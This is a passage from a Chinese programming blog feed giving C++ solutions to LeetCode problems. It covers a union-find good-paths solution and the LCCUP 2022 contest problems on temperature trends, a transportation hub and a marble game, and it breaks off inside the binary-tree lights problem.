<span class="built_in">Reset</span>();</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="function"><span class="type">void</span> <span class="title">Reset</span><span class="params">()</span></span></span><br><span class="line"><span class="function">		</span>&#123;</span><br><span class="line">			<span class="keyword">for</span> (<span class="type">int</span> x = <span class="number">0</span>; x &lt; n; ++x)</span><br><span class="line">			&#123;</span><br><span class="line">				parent[x] = x;</span><br><span class="line">				size[x] = <span class="number">1</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">// Find the representative of x.</span></span><br><span class="line">		<span class="function"><span class="type">int</span> <span class="title">Find</span><span class="params">(<span class="type">int</span> x)</span></span></span><br><span class="line"><span class="function">		</span>&#123;</span><br><span class="line">			<span class="keyword">return</span> parent[x] == x ? x : parent[x] = <span class="built_in">Find</span>(parent[x]);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">// Return the size of component of x.</span></span><br><span class="line">		<span class="function"><span class="type">int</span> <span class="title">Size</span><span class="params">(<span class="type">int</span> x)</span></span></span><br><span class="line"><span class="function">		</span>&#123;</span><br><span class="line">			<span class="keyword">return</span> size[<span class="built_in">Find</span>(x)];</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">// Union x and y.</span></span><br><span class="line">		<span class="function"><span class="type">void</span> <span class="title">Union</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span></span></span><br><span class="line"><span class="function">		</span>&#123;</span><br><span class="line">			x = <span class="built_in">Find</span>(x);</span><br><span class="line">			y = <span class="built_in">Find</span>(y);</span><br><span class="line">			<span class="keyword">if</span> (x != y)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">if</span> (size[x] &gt; size[y]) std::<span class="built_in">swap</span>(x, y);</span><br><span class="line">				size[y] += size[x];</span><br><span class="line">				parent[x] = y;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">// Union x into y</span></span><br><span class="line">		<span class="function"><span class="type">void</span> <span class="title">UnionOblivious</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span></span></span><br><span class="line"><span class="function">		</span>&#123;</span><br><span class="line">			x = <span class="built_in">Find</span>(x);</span><br><span class="line">			y = <span class="built_in">Find</span>(y);</span><br><span class="line">			<span class="keyword">if</span> (x != y)</span><br><span class="line">			&#123;</span><br><span class="line">				size[y] += size[x];</span><br><span class="line">				parent[x] = y;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">numberOfGoodPaths</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; vals, vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; edges)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = vals.<span class="built_in">size</span>();</span><br><span class="line">        map&lt;<span class="type">int</span>, vector&lt;<span class="type">int</span>&gt;&gt; cnt;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            cnt[vals[i]].<span class="built_in">emplace_back</span>(i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">sort</span>(edges.<span class="built_in">begin</span>(), edges.<span class="built_in">end</span>(), [&amp;](<span class="type">const</span> vector&lt;<span class="type">int</span>&gt; &amp;a, <span class="type">const</span> vector&lt;<span class="type">int</span>&gt; &amp;b) &#123;</span><br><span class="line">           <span class="keyword">return</span> <span class="built_in">max</span>(vals[a[<span class="number">0</span>]], vals[a[<span class="number">1</span>]]) &lt;  <span class="built_in">max</span>(vals[b[<span class="number">0</span>]], vals[b[<span class="number">1</span>]]);</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> ans = n;</span><br><span class="line">        <span class="function">data_structure::DisjointSet <span class="title">djset</span><span class="params">(n)</span></span>;</span><br><span class="line">        <span class="type">int</span> j = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> [val, vec] : cnt) &#123;</span><br><span class="line">            <span class="keyword">while</span> (j &lt; edges.<span class="built_in">size</span>() &amp;&amp; vals[edges[j][<span class="number">0</span>]] &lt;= val &amp;&amp; vals[edges[j][<span class="number">1</span>]] &lt;= val) &#123;</span><br><span class="line">                djset.<span class="built_in">Union</span>(edges[j][<span class="number">0</span>], edges[j][<span class="number">1</span>]);</span><br><span class="line">                j++;</span><br><span class="line">            &#125;</span><br><span class="line">            unordered_map&lt;<span class="type">int</span>,<span class="type">int</span>&gt; count;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; vec.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">                count[djset.<span class="built_in">Find</span>(vec[i])]++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">auto</span> [_, v] : count) &#123;</span><br><span class="line">                ans += v * (v - <span class="number">1</span>) / <span class="number">2</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>欢迎关注和打赏，感谢支持！</p>
<ul>
<li>关注我的博客: <a href="http://mikemeng.org/">http://mikemeng.org/</a></li>
<li>关注我的知乎：<a href="https://www.zhihu.com/people/da-hua-niu">https://www.zhihu.com/people/da-hua-niu</a></li>
<li>关注我的微信公众号: 公务程序猿<br><img src="https://i.loli.net/2020/11/16/xtyDOgT6Gm1AKdS.png" alt="1"></li>
</ul>
]]></content>
      <categories>
        <category>力扣周赛</category>
      </categories>
      <tags>
        <tag>力扣周赛</tag>
      </tags>
  </entry>
  <entry>
    <title>leetcode LCCUP 2022</title>
    <url>/2022/11/02/%E5%8A%9B%E6%89%A3%E5%91%A8%E8%B5%9B%E9%A2%98%E8%A7%A3/38/</url>
    <content><![CDATA[<h2 id="leetcode-LCCUP-2022"><a href="#leetcode-LCCUP-2022" class="headerlink" title="leetcode LCCUP 2022"></a>leetcode LCCUP 2022</h2><p>只能说水了三道题目，第四题 <code>dp</code> 某个转移公式推的不对。</p>
<h4 id="LCP-61-气温变化趋势"><a href="#LCP-61-气温变化趋势" class="headerlink" title="LCP 61. 气温变化趋势"></a>LCP 61. 气温变化趋势</h4><h4 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h4><p>力扣城计划在两地设立「力扣嘉年华」的分会场，气象小组正在分析两地区的气温变化趋势，对于第 <code>i ~ (i+1)</code> 天的气温变化趋势，将根据以下规则判断：</p>
<ul>
<li>若第 <code>i+1</code> 天的气温 高于 第 <code>i</code> 天，为 上升 趋势</li>
<li>若第 <code>i+1</code> 天的气温 等于 第 <code>i</code> 天，为 平稳 趋势</li>
<li>若第 <code>i+1</code> 天的气温 低于 第 <code>i</code> 天，为 下降 趋势<br>已知 <code>temperatureA[i]</code> 和 <code>temperatureB[i]</code> 分别表示第 <code>i</code> 天两地区的气温。 组委会希望找到一段天数尽可能多，且两地气温变化趋势相同的时间举办嘉年华活动。请分析并返回两地气温变化趋势相同的最大连续天数。</li>
</ul>
<p>即最大的 <code>n</code>，使得第 <code>i~i+n</code> 天之间，两地气温变化趋势相同</p>
<p>示例 1：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入： temperatureA = [21,18,18,18,31] temperatureB = [34,32,16,16,17]</span><br><span class="line">输出：2</span><br><span class="line">解释：如下表所示， 第 2～4 天两地气温变化趋势相同，且持续时间最长，因此返回 4-2=2image.png</span><br></pre></td></tr></table></figure>
<p>示例 2：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入： temperatureA = [5,10,16,-6,15,11,3] temperatureB = [16,22,23,23,25,3,-16]</span><br><span class="line"></span><br><span class="line">输出：3</span><br></pre></td></tr></table></figure>
<p>提示：</p>
<ul>
<li><code>2 &lt;= temperatureA.length == temperatureB.length &lt;= 1000</code></li>
<li><code>-20 &lt;= temperatureA[i], temperatureB[i] &lt;= 40</code></li>
</ul>
<h4 id="地址"><a href="#地址" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/problems/6CE719/">https://leetcode.cn/problems/6CE719/</a></p>
<h4 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h4><pre><code>模拟
</code></pre>
<h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><ol>
<li>刚开始理解错了，后来发现其实很简单，只需要判断相邻的两天，两个温度记录的变换趋势是否相同：</li>
</ol>
<ul>
<li>同时增减；</li>
<li>同时减少；</li>
<li>同时相等；</li>
</ul>
<ol start="2">
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：$O(n \log n)$，其中 $n$ 表示数组的长度。</li>
<li>空间复杂度：$O(n \log n)$，其中 $n$ 表示数组的长度。</li>
</ul>
<h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">checkSameTrend</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2, <span class="type">int</span> b1, <span class="type">int</span> b2)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> ((a2 &gt; a1 &amp;&amp; b2 &gt; b1) || (a2 &lt; a1 &amp;&amp; b2 &lt; b1) || (a2 == a1 &amp;&amp; b2 == b1)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">temperatureTrend</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; temperatureA, vector&lt;<span class="type">int</span>&gt;&amp; temperatureB)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = temperatureA.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> ans = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> cur = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">checkSameTrend</span>(temperatureA[i - <span class="number">1</span>], temperatureA[i], </span><br><span class="line">                               temperatureB[i - <span class="number">1</span>], temperatureB[i])) &#123;</span><br><span class="line">                cur++;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                cur = <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            ans = <span class="built_in">max</span>(ans, cur);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="LCP-62-交通枢纽"><a href="#LCP-62-交通枢纽" class="headerlink" title="LCP 62. 交通枢纽"></a>LCP 62. 交通枢纽</h3><h4 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h4><p>为了缓解「力扣嘉年华」期间的人流压力，组委会在活动期间开设了一些交通专线。<code>path[i] = [a, b]</code> 表示有一条从地点 <code>a</code> 通往地点 <code>b</code> 的 单向 交通专线。 若存在一个地点，满足以下要求，我们则称之为 交通枢纽：</p>
<p>所有地点（除自身外）均有一条 单向 专线 直接 通往该地点；<br>该地点不存在任何 通往其他地点 的单向专线。<br>请返回交通专线的 交通枢纽。若不存在，则返回 <code>-1</code>。</p>
<p>注意：</p>
<p>对于任意一个地点，至少被一条专线连通。<br>示例 1：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：path = [[0,1],[0,3],[1,3],[2,0],[2,3]]</span><br><span class="line"></span><br><span class="line">输出：3</span><br><span class="line"></span><br><span class="line">解释：如下图所示： 地点 0,1,2 各有一条通往地点 3 的交通专线， 且地点 3 不存在任何通往其他地点的交通专线。image.png</span><br></pre></td></tr></table></figure>
<p>示例 2：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：path = [[0,3],[1,0],[1,3],[2,0],[3,0],[3,2]]</span><br><span class="line"></span><br><span class="line">输出：-1</span><br><span class="line"></span><br><span class="line">解释：如下图所示：不存在满足 交通枢纽 的地点。image.png</span><br></pre></td></tr></table></figure>
<p>提示：</p>
<ul>
<li><code>1 &lt;= path.length &lt;= 1000</code></li>
<li><code>0 &lt;= path[i][0], path[i][1] &lt;= 1000</code></li>
<li><code>path[i][0]</code> 与 <code>path[i][1]</code> 不相等</li>
</ul>
<h4 id="地址-1"><a href="#地址-1" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/contest/cnunionpay2022/problems/6olJmJ/">https://leetcode.cn/contest/cnunionpay2022/problems/6olJmJ/</a></p>
<h4 id="题意-1"><a href="#题意-1" class="headerlink" title="题意"></a>题意</h4><pre><code>图论
</code></pre>
<h4 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h4><ol>
<li>根据题意可知在有向图中交通枢纽即入度为 $n-1$，出度为 $0$ 的节点，所以我们直接统计每个节点的出度与入度即可。</li>
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：时间复杂度为 $O(n)$，其中 $n$ 表示每节点的数目。</li>
<li>空间复杂度：空间复杂度为 $O(n)$，其中 $n$ 表示每节点的数目。</li>
</ul>
<h4 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">transportationHub</span><span class="params">(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; path)</span> </span>&#123;</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">indegree</span><span class="params">(<span class="number">1001</span>)</span></span>;</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">outdegree</span><span class="params">(<span class="number">1001</span>)</span></span>;</span><br><span class="line">        unordered_set&lt;<span class="type">int</span>&gt; vertx;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> v : path) &#123;</span><br><span class="line">            indegree[v[<span class="number">1</span>]]++;</span><br><span class="line">            outdegree[v[<span class="number">0</span>]]++;</span><br><span class="line">            vertx.<span class="built_in">emplace</span>(v[<span class="number">0</span>]);</span><br><span class="line">            vertx.<span class="built_in">emplace</span>(v[<span class="number">1</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> n = vertx.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> v : vertx) &#123;</span><br><span class="line">            <span class="keyword">if</span> (indegree[v] == n - <span class="number">1</span> &amp;&amp; outdegree[v] == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> v;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="3-弹珠游戏"><a href="#3-弹珠游戏" class="headerlink" title="3. 弹珠游戏"></a>3. 弹珠游戏</h3><h4 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h4><p>欢迎各位来到「力扣嘉年华」，接下来将为各位介绍在活动中广受好评的弹珠游戏。</p>
<p><code>N*M</code> 大小的弹珠盘的初始状态信息记录于一维字符串型数组 <code>plate</code> 中，数组中的每个元素为仅由 <code>&quot;O&quot;、&quot;W&quot;、&quot;E&quot;、&quot;.&quot;</code> 组成的字符串。其中：</p>
<ul>
<li><code>&quot;O&quot;</code> 表示弹珠洞（弹珠到达后会落入洞中，并停止前进）；</li>
<li><code>&quot;W&quot;</code> 表示逆时针转向器（弹珠经过时方向将逆时针旋转 <code>90</code> 度）；</li>
<li><code>&quot;E&quot;</code> 表示顺时针转向器（弹珠经过时方向将顺时针旋转 <code>90</code> 度）；</li>
<li><code>&quot;.&quot;</code> 表示空白区域（弹珠可通行）。<br>游戏规则要求仅能在边缘位置的 空白区域 处（弹珠盘的四角除外）沿 与边缘垂直 的方向打入弹珠，并且打入后的每颗弹珠最多能 前进 <code>num</code> 步。请返回符合上述要求且可以使弹珠最终入洞的所有打入位置。你可以 按任意顺序 返回答案。</li>
</ul>
<p>注意：</p>
<p>若弹珠已到达弹珠盘边缘并且仍沿着出界方向继续前进，则将直接出界。<br>示例 1：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：</span><br><span class="line">num = 4</span><br><span class="line">plate = [&quot;..E.&quot;,&quot;.EOW&quot;,&quot;..W.&quot;]</span><br></pre></td></tr></table></figure>
<p>输出：[[2,1]]</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">解释：</span><br><span class="line">在 [2,1] 处打入弹珠，弹珠前进 1 步后遇到转向器，前进方向顺时针旋转 90 度，再前进 1 步进入洞中。</span><br><span class="line">b054955158a99167b8d51da0e22a54da.gif</span><br></pre></td></tr></table></figure>
<p>示例 2：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：</span><br><span class="line">num = 5</span><br><span class="line">plate = [&quot;.....&quot;,&quot;..E..&quot;,&quot;.WO..&quot;,&quot;.....&quot;]</span><br><span class="line"></span><br><span class="line">输出：[[0,1],[1,0],[2,4],[3,2]]</span><br><span class="line"></span><br><span class="line">解释：</span><br><span class="line">在 [0,1] 处打入弹珠，弹珠前进 2 步，遇到转向器后前进方向逆时针旋转 90 度，再前进 1 步进入洞中。</span><br><span class="line">在 [1,0] 处打入弹珠，弹珠前进 2 步，遇到转向器后前进方向顺时针旋转 90 度，再前进 1 步进入洞中。</span><br><span class="line">在 [2,4] 处打入弹珠，弹珠前进 2 步后进入洞中。</span><br><span class="line">在 [3,2] 处打入弹珠，弹珠前进 1 步后进入洞中。</span><br><span class="line">b44e9963239ae368badf3d00b7563087.gif</span><br></pre></td></tr></table></figure>
<p>示例 3：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：</span><br><span class="line">num = 3</span><br><span class="line">plate = [&quot;.....&quot;,&quot;....O&quot;,&quot;....O&quot;,&quot;.....&quot;]</span><br><span class="line"></span><br><span class="line">输出：[]</span><br><span class="line"></span><br><span class="line">解释：</span><br><span class="line">由于弹珠被击中后只能前进 3 步，且不能在弹珠洞和弹珠盘四角打入弹珠，故不存在能让弹珠入洞的打入位置。</span><br></pre></td></tr></table></figure>
<p>提示：</p>
<ul>
<li><code>1 &lt;= num &lt;= 10^6</code></li>
<li><code>1 &lt;= plate.length, plate[i].length &lt;= 1000</code></li>
<li><code>plate[i][j]</code> 仅包含 <code>&quot;O&quot;、&quot;W&quot;、&quot;E&quot;、&quot;.&quot;</code></li>
</ul>
<h4 id="地址-2"><a href="#地址-2" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/contest/season/2022-fall/problems/EXvqDp/">https://leetcode.cn/contest/season/2022-fall/problems/EXvqDp/</a></p>
<h4 id="题意-2"><a href="#题意-2" class="headerlink" title="题意"></a>题意</h4><pre><code>BFS
</code></pre>
<h4 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h4><ol>
<li>感觉这个题目暴力模拟即可，由于只有两个方向改变，所以可能每个弹珠的轨迹不会成环。所以我们只需要进行暴力模拟即可。</li>
<li>复杂度分析</li>
</ol>
<ul>
<li>时间复杂度：时间复杂度为 $O(n^2)$，$n$ 为矩阵的行数。</li>
<li>空间复杂度：时间复杂度为 $O(n^2)$，$n$ 为矩阵的行数。</li>
</ul>
<h4 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">check</span><span class="params">(<span class="type">int</span> step, <span class="type">int</span> x, <span class="type">int</span> y, <span class="type">int</span> d, vector&lt;string&gt;&amp; plate)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> m = plate.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> n = plate[<span class="number">0</span>].<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> dirs[<span class="number">4</span>][<span class="number">2</span>] = &#123;&#123;<span class="number">0</span>, <span class="number">1</span>&#125;, &#123;<span class="number">1</span>, <span class="number">0</span>&#125;, &#123;<span class="number">0</span>, <span class="number">-1</span>&#125;, &#123;<span class="number">-1</span>, <span class="number">0</span>&#125;&#125;;</span><br><span class="line">        <span class="keyword">while</span> (step &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (plate[x][y] == <span class="string">&#x27;O&#x27;</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (plate[x][y] == <span class="string">&#x27;.&#x27;</span>) &#123;</span><br><span class="line">                <span class="type">int</span> nx = dirs[d][<span class="number">0</span>] + x;</span><br><span class="line">                <span class="type">int</span> ny = dirs[d][<span class="number">1</span>] + y;</span><br><span class="line">                <span class="keyword">if</span> (nx &gt;= <span class="number">0</span> &amp;&amp; ny &gt;= <span class="number">0</span> &amp;&amp; nx &lt; m &amp;&amp; ny &lt; n) &#123;</span><br><span class="line">                    x = nx;</span><br><span class="line">                    y = ny;</span><br><span class="line"></span><br><span class="line">                    step--;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (plate[x][y] == <span class="string">&#x27;E&#x27;</span>) &#123;</span><br><span class="line">                <span class="type">int</span> nx = dirs[(d + <span class="number">1</span> + <span class="number">4</span>) % <span class="number">4</span>][<span class="number">0</span>] + x;</span><br><span class="line">                <span class="type">int</span> ny = dirs[(d + <span class="number">1</span> + <span class="number">4</span>) % <span class="number">4</span>][<span class="number">1</span>] + y;</span><br><span class="line">                <span class="keyword">if</span> (nx &gt;= <span class="number">0</span> &amp;&amp; ny &gt;= <span class="number">0</span> &amp;&amp; nx &lt; m &amp;&amp; ny &lt; n) &#123;</span><br><span class="line">                    x = nx;</span><br><span class="line">                    y = ny;</span><br><span class="line">                    d = (d + <span class="number">1</span> + <span class="number">4</span>) % <span class="number">4</span>;</span><br><span class="line">        </span><br><span class="line">                    step--;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (plate[x][y] == <span class="string">&#x27;W&#x27;</span>) &#123;</span><br><span class="line">                <span class="type">int</span> nx = dirs[(d - <span class="number">1</span> + <span class="number">4</span>) % <span class="number">4</span>][<span class="number">0</span>] + x;</span><br><span class="line">                <span class="type">int</span> ny = dirs[(d - <span class="number">1</span> + <span class="number">4</span>) % <span class="number">4</span>][<span class="number">1</span>] + y;</span><br><span class="line">                <span class="keyword">if</span> (nx &gt;= <span class="number">0</span> &amp;&amp; ny &gt;= <span class="number">0</span> &amp;&amp; nx &lt; m &amp;&amp; ny &lt; n) &#123;</span><br><span class="line">                    x = nx;</span><br><span class="line">                    y = ny;</span><br><span class="line">                    d = (d - <span class="number">1</span> + <span class="number">4</span>) % <span class="number">4</span>;</span><br><span class="line">                   </span><br><span class="line">                    step--;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (step &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">ballGame</span>(<span class="type">int</span> num, vector&lt;string&gt;&amp; plate) &#123;</span><br><span class="line">        <span class="type">int</span> m = plate.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> n = plate[<span class="number">0</span>].<span class="built_in">size</span>();</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; ans;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; m - <span class="number">1</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (plate[i][<span class="number">0</span>] == <span class="string">&#x27;.&#x27;</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="built_in">check</span>(num, i, <span class="number">0</span>, <span class="number">0</span>, plate)) &#123;</span><br><span class="line">                    ans.<span class="built_in">push_back</span>(&#123;i, <span class="number">0</span>&#125;);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; n - <span class="number">1</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (plate[<span class="number">0</span>][i] == <span class="string">&#x27;.&#x27;</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="built_in">check</span>(num, <span class="number">0</span>, i, <span class="number">1</span>, plate)) &#123;</span><br><span class="line">                    ans.<span class="built_in">push_back</span>(&#123;<span class="number">0</span>, i&#125;);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; m - <span class="number">1</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (plate[i][n - <span class="number">1</span>] == <span class="string">&#x27;.&#x27;</span>) &#123; </span><br><span class="line">                <span class="keyword">if</span> (<span class="built_in">check</span>(num, i, n - <span class="number">1</span>, <span class="number">2</span>, plate)) &#123;</span><br><span class="line">                    ans.<span class="built_in">push_back</span>(&#123;i, n - <span class="number">1</span>&#125;);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; n - <span class="number">1</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (plate[m - <span class="number">1</span>][i] == <span class="string">&#x27;.&#x27;</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="built_in">check</span>(num, m - <span class="number">1</span>, i, <span class="number">3</span>, plate)) &#123;</span><br><span class="line">                    ans.<span class="built_in">push_back</span>(&#123;m - <span class="number">1</span>, i&#125;);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="4-二叉树灯饰"><a href="#4-二叉树灯饰" class="headerlink" title="4. 二叉树灯饰"></a>4. 二叉树灯饰</h3><h4 id="题目-3"><a href="#题目-3" class="headerlink" title="题目"></a>题目</h4><p>「力扣嘉年华」的中心广场放置了一个巨型的二叉树形状的装饰树。每个节点上均有一盏灯和三个开关。节点值为 <code>0</code> 表示灯处于「关闭」状态，节点值为 <code>1</code> 表示灯处于「开启」状态。每个节点上的三个开关各自功能如下：</p>
<ul>
<li>开关 <code>1</code>：切换当前节点的灯的状态；</li>
<li>开关 <code>2</code>：切换 以当前节点为根 的子树中，所有节点上的灯的状态，；</li>
<li>开关 <code>3</code>：切换 当前节点及其左右子节点（若存在的话） 上的灯的状态；<br>给定该装饰的初始状态 <code>root</code> ，请返回最少需要操作多少次开关，可以关闭所有节点的灯。</li>
</ul>
<p>示例 1：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：root = [1,1,0,null,null,null,1]</span><br><span class="line"></span><br><span class="line">输出：2</span><br><span class="line"></span><br><span class="line">解释：以下是最佳的方案之一，如图所示</span><br><span class="line">b71b95bf405e3b223e00b2820a062ba4.gif</span><br></pre></td></tr></table></figure>
<p>示例 2：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：root = [1,1,1,1,null,null,1]</span><br><span class="line"></span><br><span class="line">输出：1</span><br><span class="line"></span><br><span class="line">解释：以下是最佳的方案，如图所示</span><br><span class="line">a4091b6448a0089b4d9e8f0390ff9ac6.gif</span><br></pre></td></tr></table></figure>
<p>示例 3：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：root = [0,null,0]</span><br><span class="line"></span><br><span class="line">输出：0</span><br></pre></td></tr></table></figure>
<p>解释：无需操作开关，当前所有节点上的灯均已关闭</p>
<p>提示：</p>
<ul>
